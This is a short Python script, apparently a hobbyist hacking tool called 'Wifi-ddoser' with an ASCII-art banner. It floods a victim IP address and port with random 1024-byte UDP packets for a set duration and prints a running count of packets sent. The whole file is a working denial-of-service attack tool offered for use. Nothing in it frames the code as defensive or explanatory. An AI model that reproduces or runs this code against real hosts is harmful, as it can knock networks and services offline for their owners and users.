import time
import socket
import random
import sys

def usage():
    print("\033[1;32m#########################################################")
    print("#------------------------[\033[1;91mWifi-ddoser\033[1;32m]---------------------#")
    print("#-------------------------------------------------------#")
    print("#   \033[1;91mCommand: " "python wifi-ddoser.py " "<ip> <port> <packet> \033[1;32m   #")
    print("#                                                       #")
    print("#\033[1;91mCreator:artem-cell  \033[1;32m##      ###       ##                #")
    print("#\033[1;91mTeam   : ISL        \033[1;32m##     #          ##                #")
    print("#\033[1;91mVersion:1.0        \033[1;32m##      ###       ##                #")
    print("#                   ## \033[1;91m ##     \033[1;32m#  \033[1;91m##  \033[1;32m##                #")
    print("#                   ##  \033[1;91m##  \033[1;32m###   \033[1;91m##  \033[1;32m######            #")
    print("#               \033[1;91m<--[ISL]-->         \033[1;32m#")
    print("#########################################################")
    print("                        @@@@@@@@@@")
    print("                       @@@@@@@@@@@@")
    print("                     @@@@@@@@@@@@@@@@")

def flood(victim, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Уменьшаем размер каждого пакета до, например, 1024 байт
    packet_size = 1024
    bytes = random._urandom(packet_size)
    timeout = time.time() + duration
    sent = 0

    while True:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent += 1
        print("\033[1;91mSent \033[1;32m%s \033[1;91mPackets to host \033[1;32m%s \033[1;91mTo Port \033[1;32m%s " % (sent, victim, vport))

def main():
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()